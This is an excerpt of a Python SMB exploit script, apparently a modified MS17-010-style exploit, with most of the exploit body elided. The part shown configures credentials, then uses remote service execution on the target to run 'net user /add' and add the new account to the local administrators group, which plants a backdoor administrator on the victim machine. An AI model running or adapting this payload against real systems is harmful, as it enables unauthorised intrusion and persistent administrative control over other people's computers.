...
#Existing User domain or local
USERNAME = ''
PASSWORD = ''
#New local admin user to be created
newuser = ''
newpwd = ''
...
def exploit(target, pipe_name):
	...
	# ================================
	try:
		smb_pwn(conn, info['arch'], newuser, newpwd)
	except:
		pass
...
def smb_pwn(conn, arch, newuser, newpwd):
	print("Command Time")
	smbConn = conn.get_smbconnection()

	service_exec(conn, r"cmd /c net user /add " + newuser + ' ' + newpwd)
	service_exec(conn, r"cmd /c net localgroup administrators " + newuser + ' ' + "/add")
	print("Created local administrator user "+ newuser)
